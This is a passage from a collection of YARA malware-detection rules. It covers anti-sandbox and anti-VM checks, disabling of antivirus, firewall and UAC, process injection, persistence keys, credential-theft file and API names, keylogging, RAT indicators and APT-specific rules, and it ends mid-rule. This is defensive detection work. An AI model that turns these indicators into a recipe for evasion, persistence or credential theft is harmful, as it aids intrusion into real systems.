        $s74 = "50.116.56.144"
        $s75 = "66.175.212.197"
        $s76 = "69.164.203.105"
        $s77 = "72.14.182.233"
        $s78 = "109.74.196.143"
        $s79 = "173.230.133.99"
        $s80 = "178.79.190.156"
        $s81 = "198.74.50.135"
        $s82 = "91.233.244.102"
        $s83 = "91.233.244.106"
        $s84 = "148.81.111.111"
    condition:
        any of them
}

rule antisb_joesanbox {
     meta:
        author = "x0r"
        description = "Anti-Sandbox checks for Joe Sandbox"
	version = "0.1"
    strings:
	$p1 = "Software\\Microsoft\\Windows\\CurrentVersion" nocase
	$c1 = "RegQueryValue" 
	$s1 = "55274-640-2673064-23950" 
    condition:
        all of them
}

rule antisb_anubis {
    meta:
        author = "x0r"
        description = "Anti-Sandbox checks for Anubis"
	version = "0.1"
    strings:
        $p1 = "Software\\Microsoft\\Windows\\CurrentVersion" nocase
        $c1 = "RegQueryValue" 
        $s1 = "76487-337-8429955-22614" 
        $s2 = "76487-640-1457236-23837" 
    condition:
        $p1 and $c1 and 1 of ($s*)
}

rule antisb_threatExpert {
    meta:
        author = "x0r"
        description = "Anti-Sandbox checks for ThreatExpert"
	version = "0.1"
    strings:
        $f1 = "dbghelp.dll" nocase 
    condition:
        all of them
}

rule antisb_sandboxie {
    meta:
        author = "x0r"
        description = "Anti-Sandbox checks for Sandboxie"
	version = "0.1"
    strings:
        $f1 = "SbieDLL.dll" nocase 
    condition:
        all of them
}

rule antisb_cwsandbox {
    meta:
        author = "x0r"
        description = "Anti-Sandbox checks for CWSandbox"
	version = "0.1"
    strings:
        $p1 = "Software\\Microsoft\\Windows\\CurrentVersion" nocase
        $s1 = "76487-644-3177037-23510" 
    condition:
        all of them
}

rule antivm_virtualbox {
    meta:
        author = "x0r"
        description = "AntiVM checks for VirtualBox"
	version = "0.1"
    strings:
        $s1 = "VBoxService.exe" nocase
    condition:
        any of them
}

rule antivm_vmware {
    meta:
        author = "x0r"
        description = "AntiVM checks for VMWare"
	version = "0.1"
    strings:
        $s1 = "vmware.exe" nocase
        $s2 = "vmware-authd.exe" nocase
        $s3 = "vmware-hostd.exe" nocase
        $s4 = "vmware-tray.exe" nocase
        $s5 = "vmware-vmx.exe" nocase
        $s6 = "vmnetdhcp.exe" nocase
        $s7 = "vpxclient.exe" nocase
    	$s8 = { b868584d56bb00000000b90a000000ba58560000ed }
    condition:
        any of them
}

rule antivm_bios {
    meta:
        author = "x0r"
        description = "AntiVM checks for Bios version"
	version = "0.2"
    strings:
        $p1 = "HARDWARE\\DESCRIPTION\\System" nocase
        $p2 = "HARDWARE\\DESCRIPTION\\System\\BIOS" nocase
        $c1 = "RegQueryValue" 
        $r1 = "SystemBiosVersion" 
        $r2 = "VideoBiosVersion" 
        $r3 = "SystemManufacturer" 
    condition:
        1 of ($p*) and 1 of ($c*) and 1 of ($r*)
}

rule disable_antivirus {
    meta:
        author = "x0r"
        description = "Disable AntiVirus"
	version = "0.2"
    strings:
        $p1 = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun" nocase
        $p2 = "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\" nocase
        $p3 = "SOFTWARE\\Policies\\Microsoft\\Windows Defender" nocase
        $c1 = "RegSetValue" 
        $r1 = "AntiVirusDisableNotify" 
        $r2 = "DontReportInfectionInformation" 
        $r3 = "DisableAntiSpyware" 
        $r4 = "RunInvalidSignatures" 
        $r5 = "AntiVirusOverride" 
        $r6 = "CheckExeSignatures" 
        $f1 = "blackd.exe" nocase
        $f2 = "blackice.exe" nocase
        $f3 = "lockdown.exe" nocase
        $f4 = "lockdown2000.exe" nocase
        $f5 = "taskkill.exe" nocase
        $f6 = "tskill.exe" nocase
        $f7 = "smc.exe" nocase
        $f8 = "sniffem.exe" nocase
        $f9 = "zapro.exe" nocase
        $f10 = "zlclient.exe" nocase
        $f11 = "zonealarm.exe" nocase
    condition:
        ($c1 and $p1 and 1 of ($f*)) or ($c1 and $p2) or 1 of ($r*) or $p3
}

rule disable_uax {
    meta:
        author = "x0r"
        description = "Disable User Access Control"
	version = "0.1"
    strings:
        $p1 = "SOFTWARE\\Microsoft\\Security Center" nocase
        $r1 = "UACDisableNotify"
    condition:
        all of them
}

rule disable_firewall {
    meta:
        author = "x0r"
        description = "Disable Firewall"
	version = "0.1"
    strings:
        $p1 = "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy" nocase
        $c1 = "RegSetValue" 
        $r1 = "FirewallPolicy" 
        $r2 = "EnableFirewall" 
        $r3 = "FirewallDisableNotify" 
        $s1 = "netsh firewall add allowedprogram"
    condition:
        (1 of ($p*) and $c1 and 1 of ($r*)) or $s1
}

rule disable_registry {
    meta:
        author = "x0r"
        description = "Disable Registry editor"
	version = "0.1"
    strings:
        $p1 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" nocase
        $c1 = "RegSetValue" 
        $r1 = "DisableRegistryTools" 
        $r2 = "DisableRegedit" 
    condition:
        1 of ($p*) and $c1 and 1 of ($r*)
}

rule disable_dep {
    meta:
        author = "x0r"
        description = "Bypass DEP"
	version = "0.1"
    strings:
        $c1 = "EnableExecuteProtectionSupport" 
        $c2 = "NtSetInformationProcess" 
        $c3 = "VirtualProctectEx" 
        $c4 = "SetProcessDEPPolicy" 
        $c5 = "ZwProtectVirtualMemory" 
    condition:
        any of them
}

rule disable_taskmanager {
    meta:
        author = "x0r"
        description = "Disable Task Manager"
	version = "0.1"
    strings:
        $p1 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" nocase
        $r1 = "DisableTaskMgr" 
    condition:
        1 of ($p*) and 1 of ($r*)
}

rule inject_thread {
    meta:
        author = "x0r"
        description = "Code injection with CreateRemoteThread in a remote process"
	version = "0.1"
    strings:
        $c1 = "OpenProcess" 
        $c2 = "VirtualAllocEx" 
        $c3 = "NtWriteVirtualMemory" 
        $c4 = "WriteProcessMemory" 
        $c5 = "CreateRemoteThread"
        $c6 = "CreateThread"
        $c7 = "OpenProcess" 
    condition:
        $c1 and $c2 and ( $c3 or $c4 ) and ( $c5 or $c6 or $c7 )
}

rule create_process {
    meta:
        author = "x0r"
        description = "Create a new process"
	version = "0.2"
    strings:
        $f1 = "Shell32.dll" nocase
        $f2 = "Kernel32.dll" nocase
        $c1 = "ShellExecute" 
        $c2 = "WinExec" 
        $c3 = "CreateProcess"
        $c4 = "CreateThread"
    condition:
        ($f1 and $c1 ) or $f2 and ($c2 or $c3 or $c4)
}

rule persistence {
    meta:
        author = "x0r"
        description = "Install itself for autorun at Windows startup"
	version = "0.1"
    strings:
        $p1 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" nocase
        $p2 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce" nocase
        $p3 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServices" nocase
        $p4 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce" nocase
        $p5 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" nocase
        $p6 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run" nocase
        $p7 = "SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\" nocase
        $p8 = "SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Windows" nocase
        $p9 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\SharedTaskScheduler" nocase
        $p10 = "comfile\\shell\\open\\command" nocase
        $p11 = "piffile\\shell\\open\\command" nocase
        $p12 = "exefile\\shell\\open\\command" nocase
        $p13 = "txtfile\\shell\\open\\command" nocase
	$p14 = "\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options"
        $f1 = "win.ini" nocase
        $f2 = "system.ini" nocase
        $f3 = "Start Menu\\Programs\\Startup" nocase
    condition:
        any of them
}

rule hijack_network {
    meta:
        author = "x0r"
        description = "Hijack network configuration"
	version = "0.1"
    strings:
        $p1 = "SOFTWARE\\Classes\\PROTOCOLS\\Handler" nocase
        $p2 = "SOFTWARE\\Classes\\PROTOCOLS\\Filter" nocase
        $p3 = "Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ProxyServer" nocase
        $p4 = "software\\microsoft\\windows\\currentversion\\internet settings\\proxyenable" nocase
        $f1 = "drivers\\etc\\hosts" nocase
    condition:
        any of them
}

rule create_service {
    meta:
        author = "x0r"
        description = "Create a windows service"
	version = "0.2"
    strings:
	$f1 = "Advapi32.dll" nocase
        $c1 = "CreateService" 
        $c2 = "ControlService" 
        $c3 = "StartService" 
        $c4 = "QueryServiceStatus" 
    condition:
        all of them
}

rule create_com_service {
    meta:
        author = "x0r"
        description = "Create a COM server"
	version = "0.1"
    strings:
        $c1 = "DllCanUnloadNow" nocase
        $c2 = "DllGetClassObject" 
        $c3 = "DllInstall" 
        $c4 = "DllRegisterServer" 
        $c5 = "DllUnregisterServer" 
    condition:
        all of them
}

rule network_udp_sock {
    meta:
        author = "x0r"
        description = "Communications over UDP network"
	version = "0.1"
    strings:
        $f1 = "Ws2_32.dll" nocase
	$f2 = "System.Net" nocase
        $f3 = "wsock32.dll" nocase
        $c0 = "WSAStartup" 
        $c1 = "sendto" 
        $c2 = "recvfrom" 
        $c3 = "WSASendTo" 
        $c4 = "WSARecvFrom" 
        $c5 = "UdpClient" 
    condition:
        (($f1 or $f3) and 2 of ($c*)) or ($f2 and $c5)
}

rule network_tcp_listen {
    meta:
        author = "x0r"
        description = "Listen for incoming communication"
	version = "0.1"
    strings:
        $f1 = "Ws2_32.dll" nocase
        $f2 = "Mswsock.dll" nocase
	    $f3 = "System.Net" nocase
        $f4 = "wsock32.dll" nocase
        $c1 = "bind" 
        $c2 = "accept" 
        $c3 = "GetAcceptExSockaddrs"
        $c4 = "AcceptEx" 
        $c5 = "WSAStartup" 
        $c6 = "WSAAccept" 
        $c7 = "WSASocket" 
        $c8 = "TcpListener" 
        $c9 = "AcceptTcpClient"
        $c10 = "listen"
    condition:
        1 of ($f*) and 2 of ($c*)
}

rule network_dyndns {
    meta:
        author = "x0r"
        description = "Communications dyndns network"
	version = "0.1"
    strings:	
	$s1 =".no-ip.org"
        $s2 =".publicvm.com"
        $s3 =".linkpc.net"
        $s4 =".dynu.com"
        $s5 =".dynu.net"
        $s6 =".afraid.org"
        $s7 =".chickenkiller.com"
        $s8 =".crabdance.com"
        $s9 =".ignorelist.com"
        $s10 =".jumpingcrab.com"
        $s11 =".moo.com"
        $s12 =".strangled.com"
        $s13 =".twillightparadox.com"
        $s14 =".us.to"
        $s15 =".strangled.net"
        $s16 =".info.tm"
        $s17 =".homenet.org"
        $s18 =".biz.tm"
        $s19 =".continent.kz"
        $s20 =".ax.lt"
        $s21 =".system-ns.com"
        $s22 =".adultdns.com"
        $s23 =".craftx.biz"
        $s24 =".ddns01.com"
        $s25 =".dns53.biz"
        $s26 =".dnsapi.info"
        $s27 =".dnsd.info"
        $s28 =".dnsdynamic.com"
        $s29 =".dnsdynamic.net"
        $s30 =".dnsget.org"
        $s31 =".fe100.net"
        $s32 =".flashserv.net"
        $s33 =".ftp21.net"
    condition:
        any of them
}

rule network_toredo {
    meta:
        author = "x0r"
        description = "Communications over Toredo network"
	version = "0.1"
    strings:	
	$f1 = "FirewallAPI.dll" nocase
        $p1 = "\\CurrentControlSet\\Services\\Tcpip6\\Parameters\\Interfaces\\" nocase
    condition:
        all of them
}

rule network_smtp_dotNet {
    meta:
        author = "x0r"
        description = "Communications smtp"
	version = "0.1"
    strings:	
	$f1 = "System.Net.Mail" nocase
        $p1 = "SmtpClient" nocase
    condition:
        all of them
}

rule network_smtp_raw {
    meta:
        author = "x0r"
        description = "Communications smtp"
	version = "0.1"
    strings:	
	$s1 = "MAIL FROM:" nocase
        $s2 = "RCPT TO:" nocase
    condition:
        all of them
}

rule network_smtp_vb {
    meta:
        author = "x0r"
        description = "Communications smtp"
	version = "0.1"
    strings:	
	$c1 = "CDO.Message" nocase
        $c2 = "cdoSMTPServer" nocase
        $c3 = "cdoSendUsingMethod" nocase
        $c4 = "cdoex.dll" nocase
        $c5 = "/cdo/configuration/smtpserver" nocase
    condition:
        any of them
}

rule network_p2p_win {
    meta:
        author = "x0r"
        description = "Communications over P2P network"
	version = "0.1"
    strings:	
     	$c1 = "PeerCollabExportContact"
     	$c2 = "PeerCollabGetApplicationRegistrationInfo"
     	$c3 = "PeerCollabGetEndpointName"
     	$c4 = "PeerCollabGetEventData"
     	$c5 = "PeerCollabGetInvitationResponse"
     	$c6 = "PeerCollabGetPresenceInfo"
     	$c7 = "PeerCollabGetSigninOptions"
     	$c8 = "PeerCollabInviteContact"
     	$c9 = "PeerCollabInviteEndpoint"
     	$c10 = "PeerCollabParseContact"
     	$c11 = "PeerCollabQueryContactData"
     	$c12 = "PeerCollabRefreshEndpointData"
     	$c13 = "PeerCollabRegisterApplication"
     	$c14 = "PeerCollabRegisterEvent"
     	$c15 = "PeerCollabSetEndpointName"
     	$c16 = "PeerCollabSetObject"
     	$c17 = "PeerCollabSetPresenceInfo"
     	$c18 = "PeerCollabSignout"
     	$c19 = "PeerCollabUnregisterApplication"
     	$c20 = "PeerCollabUpdateContact"
    condition:
        5 of them
}

rule network_tor {
    meta:
        author = "x0r"
        description = "Communications over TOR network"
	version = "0.1"
    strings:
        $p1 = "tor\\hidden_service\\private_key" nocase
        $p2 = "tor\\hidden_service\\hostname" nocase
        $p3 = "tor\\lock" nocase
        $p4 = "tor\\state" nocase
    condition:
        any of them
}
rule network_irc {
    meta:
        author = "x0r"
        description = "Communications over IRC network"
	version = "0.1"
    strings:
        $s1 = "NICK" 
        $s2 = "PING" 
        $s3 = "JOIN" 
        $s4 = "USER" 
        $s5 = "PRIVMSG" 
    condition:
        all of them
}

rule network_http {
    meta:
        author = "x0r"
        description = "Communications over HTTP"
	version = "0.1"
    strings:
        $f1 = "wininet.dll" nocase
        $c1 = "InternetConnect" 
        $c2 = "InternetOpen" 
        $c3 = "InternetOpenUrl" 
        $c4 = "InternetReadFile" 
        $c5 = "InternetWriteFile" 
        $c6 = "HttpOpenRequest" 
        $c7 = "HttpSendRequest" 
        $c8 = "IdHTTPHeaderInfo" 
    condition:
        $f1 and $c1 and ($c2 or $c3) and ($c4 or $c5 or $c6 or $c7 or $c8)
}

rule network_dropper {
    meta:
        author = "x0r"
        description = "File downloader/dropper" 
	version = "0.1"
    strings:
        $f1 = "urlmon.dll" nocase
        $c1 = "URLDownloadToFile" 
        $c2 = "URLDownloadToCacheFile" 
        $c3 = "URLOpenStream" 
        $c4 = "URLOpenPullStream" 
    condition:
        $f1 and 1 of ($c*)
}

rule network_ftp {
    meta:
        author = "x0r"
        description = "Communications over FTP" 
	version = "0.1"
    strings:
	   $f1 = "Wininet.dll" nocase
        $c1 = "FtpGetCurrentDirectory" 
        $c2 = "FtpGetFile" 
        $c3 = "FtpPutFile" 
        $c4 = "FtpSetCurrentDirectory" 
        $c5 = "FtpOpenFile" 
        $c6 = "FtpGetFileSize" 
        $c7 = "FtpDeleteFile" 
        $c8 = "FtpCreateDirectory" 
        $c9 = "FtpRemoveDirectory" 
        $c10 = "FtpRenameFile" 
        $c11 = "FtpDownload" 
        $c12 = "FtpUpload" 
        $c13 = "FtpGetDirectory" 
    condition:
        $f1 and (4 of ($c*))
}

rule network_tcp_socket {
    meta:
        author = "x0r"
        description = "Communications over RAW socket"
	version = "0.1"
    strings:
	$f1 = "Ws2_32.dll" nocase
        $f2 = "wsock32.dll" nocase
        $c1 = "WSASocket" 
        $c2 = "socket" 
        $c3 = "send" 
        $c4 = "WSASend" 
        $c5 = "WSAConnect"
        $c6 = "connect"
        $c7 = "WSAStartup"
        $c8 = "closesocket"
        $c9 = "WSACleanup"
    condition:
        1 of ($f*) and 2 of ($c*)
}

rule network_dns {
    meta:
        author = "x0r"
        description = "Communications use DNS"
	version = "0.1"
    strings:
        $f1 = "System.Net" 
        $f2 = "Ws2_32.dll" nocase
        $f3 = "Dnsapi.dll" nocase
        $f4 = "wsock32.dll" nocase        
        $c2 = "GetHostEntry" 
	    $c3 = "getaddrinfo"
	    $c4 = "gethostbyname"
	    $c5 = "WSAAsyncGetHostByName"
	    $c6 = "DnsQuery"
    condition:
        1 of ($f*) and  1 of ($c*) 
}

rule network_ssl {
    meta:
        author = "x0r"
        description = "Communications over SSL"
        version = "0.1"
    strings:
        $f1 = "ssleay32.dll" nocase
        $f2 = "libeay32.dll" nocase
        $f3 = "libssl32.dll" nocase
        $c1 = "IdSSLOpenSSL" nocase
    condition:
        any of them
}

rule network_dga {
    meta:
        author = "x0r"
        description = "Communication using dga"
	version = "0.1"
    strings: 
        $dll1 = "Advapi32.dll" nocase
        $dll2 = "wininet.dll" nocase
	    $dll3 = "Crypt32.dll" nocase
        $time1 = "SystemTimeToFileTime"  
        $time2 = "GetSystemTime"  
        $time3 = "GetSystemTimeAsFileTime"  
        $hash1 = "CryptCreateHash" 
        $hash2 = "CryptAcquireContext" 
        $hash3 = "CryptHashData" 
        $net1 = "InternetOpen"  
        $net2 = "InternetOpenUrl"  
        $net3 = "gethostbyname"  
        $net4 = "getaddrinfo"  
    condition:
        all of ($dll*) and 1 of ($time*) and 1 of ($hash*) and 1 of ($net*)	
}


rule bitcoin {
    meta:
        author = "x0r"
        description = "Perform crypto currency mining"
	version = "0.1"
    strings:
        $f1 = "OpenCL.dll" nocase
        $f2 = "nvcuda.dll" nocase
        $f3 = "opengl32.dll" nocase
        $s1 = "cpuminer 2.2.2X-Mining-Extensions"
        $s2 = "cpuminer 2.2.3X-Mining-Extensions"
	    $s3 = "Ufasoft bitcoin-miner/0.20"
	    $s4 = "bitcoin" nocase
	    $s5 = "stratum" nocase
    condition:
        1 of ($f*) and 1 of ($s*)
}

rule certificate {
    meta:
        author = "x0r"
        description = "Inject certificate in store"
	version = "0.1"
    strings:
        $f1 = "Crypt32.dll" nocase
        $r1 = "software\\microsoft\\systemcertificates\\spc\\certificates" nocase
        $c1 = "CertOpenSystemStore" 
    condition:
	all of them
}

rule escalate_priv {
    meta:
        author = "x0r"
        description = "Escalade priviledges"
	version = "0.1"
    strings:
        $d1 = "Advapi32.dll" nocase
        $c1 = "SeDebugPrivilege" 
        $c2 = "AdjustTokenPrivileges" 
    condition:
        1 of ($d*) and 1 of ($c*)
}

rule screenshot {
    meta:
        author = "x0r"
        description = "Take screenshot"
	version = "0.1"
    strings:
        $d1 = "Gdi32.dll" nocase
        $d2 = "User32.dll" nocase
        $c1 = "BitBlt" 
        $c2 = "GetDC" 
    condition:
        1 of ($d*) and 1 of ($c*)
}

rule lookupip {
    meta:
        author = "x0r"
        description = "Lookup external IP"
	version = "0.1"
    strings:
        $n1 = "checkip.dyndns.org" nocase
        $n2 = "whatismyip.org" nocase
        $n3 = "whatsmyipaddress.com" nocase
        $n4 = "getmyip.org" nocase
        $n5 = "getmyip.co.uk" nocase
    condition:
        any of them
}

rule dyndns {
    meta:
        author = "x0r"
        description = "Dynamic DNS"
	version = "0.1"
    strings:
        $s1 = "SOFTWARE\\Vitalwerks\\DUC" nocase
    condition:
        any of them
}

rule lookupgeo {
    meta:
        author = "x0r"
        description = "Lookup Geolocation"
	version = "0.1"
    strings:
        $n1 = "j.maxmind.com" nocase
    condition:
        any of them
}

rule keylogger {
    meta:
        author = "x0r"
        description = "Run a keylogger"
	version = "0.1"
    strings:
	    $f1 = "User32.dll" nocase
        $c1 = "GetAsyncKeyState" 
        $c2 = "GetKeyState" 
        $c3 = "MapVirtualKey" 
        $c4 = "GetKeyboardType"
    condition:
        $f1 and 1 of ($c*)
}

rule cred_local {
    meta:
        author = "x0r"
        description = "Steal credential"
	version = "0.1"
    strings:
        $c1 = "LsaEnumerateLogonSessions"
        $c2 = "SamIConnect"
        $c3 = "SamIGetPrivateData"
        $c4 = "SamQueryInformationUse"
        $c5 = "CredEnumerateA"
        $c6 = "CredEnumerateW"
        $r1 = "software\\microsoft\\internet account manager" nocase
        $r2 = "software\\microsoft\\identitycrl\\creds" nocase
        $r3 = "Security\\Policy\\Secrets"
    condition:
        any of them
}


rule sniff_audio {
    meta:
        author = "x0r"
        description = "Record Audio"
        version = "0.1"
    strings:
        $f1 = "winmm.dll" nocase
        $c1 = "waveInStart"
        $c2 = "waveInReset"
        $c3 = "waveInAddBuffer"
        $c4 = "waveInOpen"
        $c5 = "waveInClose"
    condition:
        $f1 and 2 of ($c*)
}

rule cred_ff {
    meta:
        author = "x0r"
        description = "Steal Firefox credential"
	version = "0.1"
    strings:
        $f1 = "signons.sqlite"
        $f2 = "signons3.txt"
        $f3 = "secmod.db"
        $f4 = "cert8.db"
        $f5 = "key3.db"
    condition:
        any of them
}

rule cred_vnc {
    meta:
        author = "x0r"
        description = "Steal VNC credential"
	version = "0.1"
    strings:
        $s1 = "VNCPassView"
    condition:
        all of them
}

rule cred_ie7 {
    meta:
        author = "x0r"
        description = "Steal IE 7 credential"
	version = "0.1"
    strings:
        $f1 = "Crypt32.dll" nocase
        $c1 = "CryptUnprotectData" 
        $s1 = "abe2869f-9b47-4cd9-a358-c22904dba7f7" nocase
    condition:
        all of them
}

rule sniff_lan {
    meta:
        author = "x0r"
        description = "Sniff Lan network traffic"
	version = "0.1"
    strings:
        $f1 = "packet.dll" nocase
        $f2 = "npf.sys" nocase
        $f3 = "wpcap.dll" nocase
        $f4 = "winpcap.dll" nocase
    condition:
        any of them
}

rule migrate_apc {
    meta:
        author = "x0r"
        description = "APC queue tasks migration"
	version = "0.1"
    strings:
        $c1 = "OpenThread" 
        $c2 = "QueueUserAPC" 
    condition:
        all of them
}

rule spreading_file {
    meta:
        author = "x0r"
        description = "Malware can spread east-west file"
	version = "0.1"
    strings:
        $f1 = "autorun.inf" nocase
        $f2 = "desktop.ini" nocase
        $f3 = "desktop.lnk" nocase
    condition:
        any of them
}

rule spreading_share {
    meta:
        author = "x0r"
        description = "Malware can spread east-west using share drive"
        version = "0.1"
    strings:
        $f1 = "netapi32.dll" nocase
        $c1 = "NetShareGetInfo" 
        $c2 = "NetShareEnum" 
    condition:
        $f1 and 1 of ($c*)
}

rule rat_vnc {
    meta:
        author = "x0r"
        description = "Remote Administration toolkit VNC"
	version = "0.1"
    strings:
        $f1 = "ultravnc.ini" nocase
        $c2 = "StartVNC" 
        $c3 = "StopVNC" 
    condition:
        any of them
}

rule rat_rdp {
    meta:
        author = "x0r"
        description = "Remote Administration toolkit enable RDP"
	version = "0.1"
    strings:
        $p1 = "SYSTEM\\CurrentControlSet\\Control\\Terminal Server" nocase
        $p2 = "software\\microsoft\\windows nt\\currentversion\\terminal server" nocase
        $p3 = "SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp" nocase
        $r1 = "EnableAdminTSRemote"
        $c1 = "net start termservice"
        $c2 = "sc config termservice start"
    condition:
        any of them
}

rule rat_telnet {
    meta:
        author = "x0r"
        description = "Remote Administration toolkit enable Telnet"
        version = "0.1"
    strings:
        $r1 = "software\\microsoft\\telnetserver" nocase
    condition:
        any of them
}


rule rat_webcam {
    meta:
        author = "x0r"
        description = "Remote Administration toolkit using webcam"
        version = "0.1"
    strings:
        $f1 = "avicap32.dll" nocase
        $c1 = "capCreateCaptureWindow" nocase
    condition:
        all of them
}

rule check_patchlevel {
    meta:
        author = "x0r"
        description = "Check if hotfix are applied"
	version = "0.1"
    strings:
        $p1 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Hotfix" nocase
    condition:
        any of them
}

rule win_mutex {
    meta:
        author = "x0r"
        description = "Create or check mutex"
    version = "0.1"
    strings:
        $c1 = "CreateMutex" 
    condition:
        1 of ($c*)
}

rule win_registry {
    meta:
        author = "x0r"
        description = "Affect system registries"
    version = "0.1"
    strings:
        $f1 = "advapi32.dll" nocase
        $c1 = "RegQueryValueExA"
        $c2 = "RegOpenKeyExA"
        $c3 = "RegCloseKey"
        $c4 = "RegSetValueExA"
        $c5 = "RegCreateKeyA"
        $c6 = "RegCloseKey"                  
    condition:
        $f1 and 1 of ($c*)
}

rule win_token {
    meta:
        author = "x0r"
        description = "Affect system token"
    version = "0.1"
    strings:
        $f1 = "advapi32.dll" nocase
        $c1 = "DuplicateTokenEx"
        $c2 = "AdjustTokenPrivileges"
        $c3 = "OpenProcessToken"
        $c4 = "LookupPrivilegeValueA"            
    condition:
        $f1 and 1 of ($c*)
}

rule win_private_profile {
    meta:
        author = "x0r"
        description = "Affect private profile"
    version = "0.1"
    strings:
        $f1 = "kernel32.dll" nocase
        $c1 = "GetPrivateProfileIntA"
        $c2 = "GetPrivateProfileStringA"
        $c3 = "WritePrivateProfileStringA"         
    condition:
        $f1 and 1 of ($c*)
}

rule win_files_operation {
    meta:
        author = "x0r"
        description = "Affect private profile"
    version = "0.1"
    strings:
        $f1 = "kernel32.dll" nocase
        $c1 = "WriteFile"
        $c2 = "SetFilePointer"
        $c3 = "WriteFile"
        $c4 = "ReadFile"
        $c5 = "DeleteFileA"
        $c6 = "CreateFileA"
        $c7 = "FindFirstFileA"
        $c8 = "MoveFileExA"
        $c9 = "FindClose"
        $c10 = "SetFileAttributesA"
        $c11 = "CopyFile"

    condition:
        $f1 and 3 of ($c*)
}


rule win_hook {
    meta:
        author = "x0r"
        description = "Affect hook table"
    version = "0.1"
    strings:
        $f1 = "user32.dll" nocase
        $c1 = "UnhookWindowsHookEx"
        $c2 = "SetWindowsHookExA"
        $c3 = "CallNextHookEx"         
    condition:
        $f1 and 1 of ($c*)
}
import "pe"

rule agenttesla_win_generic
{
	meta:
		author = "_kphi"
		date = "2022-09-10"
		yarahub_uuid = "d595c952-21c9-40ec-8d18-ea91cba4f197"
		yarahub_license = "CC0 1.0"
		yarahub_rule_matching_tlp = "TLP:WHITE"
		yarahub_rule_sharing_tlp = "TLP:WHITE"
		yarahub_reference_md5 = "ffaa02061474361bc88fbdbbe1c0737d"

	strings:
		$a = "MyApplication.app"
		$b = "CallByName"
		
	condition:
		uint16(0) == 0x5A4D
		and pe.version_info["CompanyName"] contains "Microsoft Corporation"
		and pe.version_info["FileDescription"] contains "SetupCleanupTask"
		and pe.version_info["ProductName"] contains "SetupCleanupTask"
		and all of them
}
rule anyburn_iso_with_date {
    meta:
        author = "Nils Kuhnert"
        date = "2022-12-22"
        description = "Triggers on ISOs created with AnyBurn using volume names such as 12_19_2022."
        hash1_md5 = "e01931b3aba4437a92578dc802e5c41d"
        hash1_sha1 = "00799e6150e97f696635718d61f1a4f993994b87"
        hash1_sha256 = "87d51bb9692823d8176ad97f0e86c1e79d704509b5ce92b23daee7dfb2d96aaa"
        yarahub_reference_md5 = "e01931b3aba4437a92578dc802e5c41d"
        yarahub_author_twitter = "@0x3c7"
        yarahub_uuid = "0f217560-0380-458a-ac9a-d9d3065e22d9"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
    strings:
        $volume_name = { 43 44 30 30 31 01 00 00 57 00 69 00 6e 00 33 
                         00 32 00 20 00 20 00 20 00 20 00 20 00 20 00 20 
                         00 20 00 20 00 20 00 20 00 3? 00 3? 00 5f 00 3?
                         00 3? 00 5f 00 3? 00 3? 00 3? 00 3? 00 20 00 20 }
        $anyburn = "AnyBurn" wide fullword
    condition:
        all of them
}
import "pe"
import "dotnet"

rule APT_Bitter_Almond_RAT {
    
    meta:
        description = "Detects Bitter (T-APT-17) Almond RAT (.NET)"
        author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
        tlp = "WHITE"
        yarahub_uuid = "5f969f39-809d-43a5-9385-83af01b66707"
        yarahub_reference_md5 = "71e1cfb5e5a515cea2c3537b78325abf"
        yarahub_license = "CC BY 4.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_author_twitter = "@SI_FalconTeam"
        reference = " https://www.secuinfra.com/en/techtalk/whatever-floats-your-boat-bitter-apt-continues-to-target-bangladesh"
        date = "2022-06-01"
        hash = "55901c2d5489d6ac5a0671971d29a31f4cdfa2e03d56e18c1585d78547a26396"

    strings:
        $function0 = "GetMacid" ascii
        $function1 = "StartCommWithServer" ascii
        $function2 = "sendingSysInfo" ascii

        $dbg0 = "*|END|*" wide
        $dbg1 = "FILE>" wide
        $dbg2 = "[Command Executed Successfully]" wide

    condition:
        uint16(0) == 0x5a4d
        and dotnet.version == "v4.0.30319"
        and filesize > 12KB // Size on Disk/1.5
        and filesize < 68KB // Size of Image*1.5
        and any of ($function*)
        and any of ($dbg*)
}rule APT_Bitter_Maldoc_Verify {
    
    meta:
        description = "Detects Bitter (T-APT-17) shellcode in oleObject (CVE-2018-0798)"
        author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
        tlp = "WHITE"
        yarahub_uuid = "d3bcf5e4-4d6c-48d1-89b1-31fc130ec65a"
        yarahub_reference_md5 = "a1d9e1dccfbba118d52f95ec6cc7c943"
        yarahub_license = "CC BY 4.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_author_twitter = "@SI_FalconTeam"
        reference = "https://www.secuinfra.com/en/techtalk/whatever-floats-your-boat-bitter-apt-continues-to-target-bangladesh"
        date = "2022-06-01"
        hash0 = "0c7158f9fc2093caf5ea1e34d8b8fffce0780ffd25191fac9c9b52c3208bc450"
        hash1 = "bd0d25194634b2c74188cfa3be6668590e564e6fe26a6fe3335f95cbc943ce1d"
        hash2 = "3992d5a725126952f61b27d43bd4e03afa5fa4a694dca7cf8bbf555448795cd6"

    strings:
        // This rule is meant to be used for verification of a Bitter Maldoc
